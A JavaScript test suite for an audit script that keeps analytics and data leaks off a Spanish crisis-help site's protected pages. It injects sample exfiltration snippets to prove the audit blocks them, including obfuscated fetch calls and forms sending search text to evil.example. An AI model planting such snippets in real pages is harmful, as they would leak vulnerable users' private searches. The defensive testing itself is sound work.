import test from 'node:test';
import assert from 'node:assert/strict';
import { cp, mkdtemp, readFile, rm, writeFile } from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { auditLaunchMeasurementSafety } from '../scripts/audit-launch-measurement-safety.mjs';

const ROOT = path.resolve(new URL('..', import.meta.url).pathname);

async function fixture(mutator) {
  const root = await mkdtemp(path.join(os.tmpdir(), 'measurement-gate-'));
  await cp(ROOT, root, {
    recursive: true,
    filter(source) {
      const relative = path.relative(ROOT, source);
      return relative !== '.git' && relative !== 'node_modules';
    },
  });
  await mutator(root);
  return root;
}

async function mutate(root, relative, transform) {
  const file = path.join(root, relative);
  await writeFile(file, transform(await readFile(file, 'utf8')));
}

async function expectHold(mutator, pattern) {
  const root = await fixture(mutator);
  try {
    const report = await auditLaunchMeasurementSafety({ root });
    assert.equal(report.decision, 'HOLD');
    assert.match(report.hard_failures.join('\n'), pattern);
  } finally { await rm(root, { recursive: true, force: true }); }
}

test('current launch measurement topology is selectively safe', async () => {
  const report = await auditLaunchMeasurementSafety({ root: ROOT });
  assert.equal(report.decision, 'MEASUREMENT_GO_WITH_SELECTIVE_EXPANSION', report.hard_failures.join('\n'));
  assert.equal(report.hard_failures.length, 0);
  assert.ok(report.homepage_dependency_files.includes('visitor-analytics.js'));
  assert.equal(report.measurement_baseline.length, 17);
  assert.ok(report.protected_surfaces.some(({ route }) => route === '/buscar/'));
});

test('comments cannot fake executable checks on a protected surface', async () => {
  const root = await fixture(async (copy) => {
    await mutate(copy, 'ayuda-urgente.html', (source) => source.replace('</body>', '<script>/* localStorage fetch credentials: include */</script></body>'));
  });
  try {
    const report = await auditLaunchMeasurementSafety({ root });
    assert.equal(report.decision, 'MEASUREMENT_GO_WITH_SELECTIVE_EXPANSION', report.hard_failures.join('\n'));
  } finally { await rm(root, { recursive: true, force: true }); }
});

test('blocks analytics and external scripts on a P0 surface', async () => {
  await expectHold(async (root) => mutate(root, 'ayuda-urgente.html', (html) => html.replace('</body>', '<script src="/analytics.js"></script></body>')), /analytics script|ENOENT/);
  await expectHold(async (root) => mutate(root, 'ayuda-urgente.html', (html) => html.replace('</body>', '<script src="https:\/\/www.googletagmanager.com\/gtag.js"></script></body>')), /external script dependency/);
});

test('blocks inline and transitive network exfiltration on protected surfaces', async () => {
  await expectHold(async (root) => mutate(root, 'buscar/index.html', (html) => html.replace('</body>', '<script>navigator.sendBeacon("/collect", "x")</script></body>')), /forbidden network request/);
  await expectHold(async (root) => {
    await writeFile(path.join(root, 'unsafe-child.js'), 'fetch("/collect")');
    await writeFile(path.join(root, 'unsafe-parent.js'), 'import "./unsafe-child.js";');
    await mutate(root, 'buscar/index.html', (html) => html.replace('</body>', '<script src="/unsafe-parent.js"></script></body>'));
  }, /unsafe-child\.js: forbidden network request/);
  await expectHold(async (root) => {
    await writeFile(path.join(root, 'hidden-net.js'), 'fetch("/collect")');
    await mutate(root, 'buscar/index.html', (html) => html.replace('</body>', '<script>const dep="/hidden-net.js"; const s=document.createElement("script"); s.src=dep</script></body>'));
  }, /non-literal dynamic script source/);
});

test('blocks query, storage and computed-property access on search', async () => {
  await expectHold(async (root) => mutate(root, 'buscar/index.html', (html) => html.replace('</body>', '<script>const x = window["location"]["search"]; localStorage.setItem("q", x)</script></body>')), /forbidden persistent storage|forbidden sensitive URL state/);
  await expectHold(async (root) => mutate(root, 'buscar/index.html', (html) => html.replace('</body>', '<script>const key = "storage"; window[key]</script></body>')), /unresolved computed global access/);
  await expectHold(async (root) => mutate(root, 'buscar/index.html', (html) => html.replace('</body>', '<script>const suffix="tch"; window["fe"+suffix]("/leak")</script></body>')), /unresolved computed global access/);
  await expectHold(async (root) => mutate(root, 'buscar/index.html', (html) => html.replace('</body>', '<script>const g=globalThis; const k="\\x66etch"; g[k]("/leak")</script></body>')), /computed access through global alias/);
});

test('protected forms cannot serialize sensitive text into a request or URL', async () => {
  await expectHold(async (root) => mutate(root, 'buscar/index.html', (html) => html.replace('</main>', '<form action="https://evil.example/leak" method="get"><textarea name="q"></textarea></form></main>')), /submission action|serializable named control/);
  await expectHold(async (root) => mutate(root, 'buscar/index.html', (html) => html.replace('</main>', '<form action=https://evil.example/leak><textarea name=q></main>')), /submission action|serializable named control/);
});

test('blocks unsafe analytics credentials, extra requests and computed evasion', async () => {
  await expectHold(async (root) => mutate(root, 'visitor-analytics.js', (source) => source.replace("credentials: 'omit'", "credentials: 'include'")), /credentials/);
  await expectHold(async (root) => mutate(root, 'visitor-analytics.js', (source) => `${source}\nfetch('/second', { credentials: 'omit' });`), /exactly one fetch/);
  await expectHold(async (root) => mutate(root, 'visitor-analytics.js', (source) => `${source}\nconst k='fetch'; window[k]('/hidden');`), /unresolved computed global access/);
  await expectHold(async (root) => mutate(root, 'visitor-analytics.js', (source) => `navigator.sendBeacon('/extra','x');\n${source}`), /unapproved network primitive/);
  await expectHold(async (root) => mutate(root, 'visitor-analytics.js', (source) => `${source}\nconst leak=fetch; leak('/extra');`), /no aliases/);
  await expectHold(async (root) => mutate(root, 'visitor-analytics.js', (source) => source.replace('https://enspficpubtttybpzhph.supabase.co', 'https://evil.example')), /exact approved Supabase origin/);
});

test('homepage coverage is proven through the real dependency graph', async () => {
  await expectHold(async (root) => mutate(root, 'app.js', (source) => source.replace("load('/visitor-analytics.js');", "// removed analytics wiring")), /does not reach visitor-analytics/);
  await expectHold(async (root) => mutate(root, 'app.js', (source) => source.replace("load('/visitor-analytics.js');", "if(false) load('/visitor-analytics.js');")), /does not reach visitor-analytics/);
  await expectHold(async (root) => mutate(root, 'app.js', (source) => source.replace("load('/visitor-analytics.js');", "false && load('/visitor-analytics.js');")), /does not reach visitor-analytics/);
  await expectHold(async (root) => mutate(root, 'app.js', (source) => `${source}\nnavigator.sendBeacon('https://evil.example/x','x');`), /unapproved direct network primitive/);
  await expectHold(async (root) => mutate(root, 'app.js', (source) => `${source}\nload('https://www.googletagmanager.com/gtag.js');`), /unapproved external module/);
  await expectHold(async (root) => mutate(root, 'app.js', (source) => source.replace("load('/visitor-analytics.js');", "if(0) load('/visitor-analytics.js');")), /pinned measurement file changed/);
  await expectHold(async (root) => mutate(root, 'app.js', (source) => `${source}\nReflect.get(globalThis,'fe'+'tch')('/leak');`), /pinned measurement file changed/);
});

test('the exact ordinary measurement baseline cannot silently shrink', async () => {
  await expectHold(async (root) => mutate(root, 'familia/index.html', (source) => source.replace('<script src="/public-page-runtime.js" async></script>', '')), /measurement baseline lost analytics wiring/);
  await expectHold(async (root) => mutate(root, 'familia/index.html', (source) => source.replace('</body>', '<script>navigator.sendBeacon("/leak","x")</script></body>')), /forbidden network request/);
});

test('cryptographic pins reject decoys, indirect calls and post-literal payload mutation', async () => {
  await expectHold(async (root) => mutate(root, 'visitor-analytics.js', (source) => source.replace('fetch(`${SUPABASE_URL}/rest/v1/rpc/record_privacy_safe_pageview`', 'fetch(`https://evil.example/rest/v1/rpc/record_privacy_safe_pageview`')), /pinned measurement file changed/);
  await expectHold(async (root) => mutate(root, 'visitor-analytics.js', (source) => source.replace("method: 'POST',", "method: 'GET',").replace("credentials: 'omit',", '').replace('const payload = {', "const decoy = { method: 'POST', credentials: 'omit' };\n  const payload = {")), /pinned measurement file changed/);
  await expectHold(async (root) => mutate(root, 'visitor-analytics.js', (source) => `${source}\nReflect.get(globalThis,String.fromCharCode(102,101,116,99,104))('/leak');`), /pinned measurement file changed/);
  await expectHold(async (root) => mutate(root, 'visitor-analytics.js', (source) => source.replace("  fetch(`${SUPABASE_URL}", "  payload.p_free_text=document.querySelector('#q')?.value;\n  fetch(`${SUPABASE_URL}")), /pinned measurement file changed/);
});

test('exact surface closures reject newly introduced obfuscated executables', async () => {
  const reflectLeak = "Reflect.get(globalThis,String.fromCharCode(102,101,116,99,104))('https://evil.example/leak')";
  await expectHold(async (root) => mutate(root, 'buscar/index.html', (source) => source.replace('</body>', `<script>${reflectLeak}</script></body>`)), /pinned measurement file changed|dependency set changed/);
  await expectHold(async (root) => {
    await writeFile(path.join(root, 'evil.js'), reflectLeak);
    await mutate(root, 'ayuda-urgente.html', (source) => source.replace('</body>', '<script src="/evil.js"></script></body>'));
  }, /protected surface dependency set changed/);
  await expectHold(async (root) => mutate(root, 'familia/index.html', (source) => source.replace('</body>', `<script>${reflectLeak}</script></body>`)), /unapproved inline executable code/);
  await expectHold(async (root) => {
    await writeFile(path.join(root, 'evil.js'), reflectLeak);
    await mutate(root, 'index.html', (source) => source.replace('</body>', '<script src="/evil.js"></script></body>'));
  }, /homepage dependency set changed/);
  await expectHold(async (root) => mutate(root, 'src/search-crisis-router.js', (source) => `${source}\n${reflectLeak}`), /pinned measurement file changed/);
  await expectHold(async (root) => mutate(root, 'resource-links.js', (source) => `${source}\n${reflectLeak}`), /pinned measurement file changed/);
  await expectHold(async (root) => mutate(root, 'ayuda-urgente.html', (source) => source.replace('</body>', `<script>${reflectLeak}</script></body>`)), /protected surface inline executable set changed/);
  await expectHold(async (root) => mutate(root, 'index.html', (source) => source.replace('</body>', `<script>${reflectLeak}</script></body>`)), /homepage has unapproved inline executable code/);
});

test('analytics storage cannot gain identifiers or free-text fields', async () => {
  await expectHold(async (root) => mutate(root, 'supabase/migrations/20260830002000_add_privacy_safe_pageview_analytics.sql', (source) => source.replace('path text not null,', 'path text not null,\n  user_id text,')), /forbidden identifier or free-text column/);
  await expectHold(async (root) => mutate(root, 'supabase/migrations/20260830002000_add_privacy_safe_pageview_analytics.sql', (source) => source.replace('security definer', '-- security definer')), /missing invariant: security definer/);
});

test('Safety route inventory is exact, unique and path-safe', async () => {
  await expectHold(async (root) => mutate(root, 'SAFETY_ROUTE_INVENTORY.md', (source) => source.replace(/^(\| `\/ayuda-urgente\.html`.*)$/m, '$1\n$1')), /duplicate routes|route sets differ/);
  await expectHold(async (root) => mutate(root, 'SAFETY_ROUTE_INVENTORY.md', (source) => source.replace('`/ayuda-urgente.html`', '`/../outside.html`')), /route sets differ|invalid Safety route/);
});
